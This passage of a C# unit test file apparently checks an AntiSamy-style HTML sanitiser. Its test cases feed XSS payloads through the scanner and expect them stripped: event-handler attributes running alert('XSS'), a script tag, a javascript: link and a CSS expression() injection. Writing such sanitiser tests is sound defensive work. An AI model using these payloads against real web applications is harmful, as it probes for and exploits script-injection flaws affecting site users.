        [TestCase(@"<body onFocus=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onFocusIn=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onFocusOut=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onHelp=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onKeyDown=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onKeyPress=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onKeyUp=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onLayoutComplete=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onLoad=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onLoseCapture=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMediaComplete=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMediaError=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseDown=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseEnter=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseLeave=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseMove=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseOut=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseOver=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseUp=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMouseWheel=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMove=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMoveEnd=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onMoveStart=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onOutOfSync=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onPaste=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onPause=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onProgress=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onPropertyChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onReadyStateChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onRepeat=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onReset=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onResize=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onResizeEnd=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onResizeStart=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onResume=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onReverse=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onRowsEnter=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onRowExit=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onRowDelete=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onRowInserted=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onScroll=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onSeek=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onSelect=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onSelectionChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onSelectStart=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onStart=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onStop=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onSyncRestored=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onSubmit=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onTimeError=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onTrackChange=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onUnload=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body onURLFlip=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<body seekSegmentTime=alert('XSS')>", @"<body></body>")]
        [TestCase(@"<p/>", @"<p />")]
        [TestCase(@"<p />", @"<p />")]
        [TestCase(@"<p                />", @"<p />")]
        [TestCase(@"<p       	       />", @"<p />")]
        [TestCase(@"<p       
       />", @"<p />")]
        [TestCase(@"<p       
       />", @"<p />")]
        [TestCase(@"<p	
	
	
>", @"<p />")]
        [TestCase(@"some text <p/> more text", @"some text <p /> more text")]
        [TestCase(@"<p>content</p>", @"<p>content</p>")]
        [TestCase(@"<table/>", @"<table></table>")]
        [TestCase(@"<table />", @"<table></table>")]
        [TestCase(@"<table                />", @"<table></table>")]
        [TestCase(@"<table       	       />", @"<table></table>")]
        [TestCase(@"<table       
       />", @"<table></table>")]
        [TestCase(@"<table       
       />", @"<table></table>")]
        [TestCase(@"<table	
	
	
>", @"<table></table>")]
        [TestCase(@"some text <table/> more text", @"some text <table></table> more text")]
        [TestCase(@"<table>content</table>", @"<table>content</table>")]
        [TestCase(@"<TABLE/>", @"<table></table>")]
        [TestCase(@"<TABLE />", @"<table></table>")]
        [TestCase(@"<TABLE                />", @"<table></table>")]
        [TestCase(@"<TABLE       	       />", @"<table></table>")]
        [TestCase(@"<TABLE       
       />", @"<table></table>")]
        [TestCase(@"<TABLE       
       />", @"<table></table>")]
        [TestCase(@"<TABLE	
	
	
>", @"<table></table>")]
        [TestCase(@"some text <TABLE/> more text", @"some text <table></table> more text")]
        [TestCase(@"<TABLE>content</TABLE>", @"<table>content</table>")]
        [TestCase(@"<tabLe/>", @"<table></table>")]
        [TestCase(@"<tabLe />", @"<table></table>")]
        [TestCase(@"<tabLe                />", @"<table></table>")]
        [TestCase(@"<tabLe       	       />", @"<table></table>")]
        [TestCase(@"<tabLe       
       />", @"<table></table>")]
        [TestCase(@"<tabLe       
       />", @"<table></table>")]
        [TestCase(@"<tabLe	
	
	
>", @"<table></table>")]
        [TestCase(@"some text <tabLe/> more text", @"some text <table></table> more text")]
        [TestCase(@"<tabLe>content</tabLe>", @"<table>content</table>")]
        [TestCase(@"Should the inputs allow javascript:alert('Error!');?", @"Should the inputs allow javascript:alert('Error!');?")]
        [TestCase(@"<a> anything <script>alert(""Error!"");</script> anything </a>", @"<a> anything  anything </a>")]
        [TestCase(@"<a href=""javascript: alert('Error!');"">Link 1</a>", @"<a>Link 1</a>")]
        [TestCase(@"<a href=""bad quote"""" />", @"<a></a>")]
        [TestCase("<div style=\"font-family:Foo,Bar\\,'a\\a';font-family:';color:expression(alert(1));y'\">aaa</div>", @"<div style="""">aaa</div>")]
        public void TestsThatWeAreRemovingDangerousStuff(string input, string expected)
        {
            Assert.AreEqual(expected, antisamy.scan(input, policy).getCleanHTML());
        }
    }
}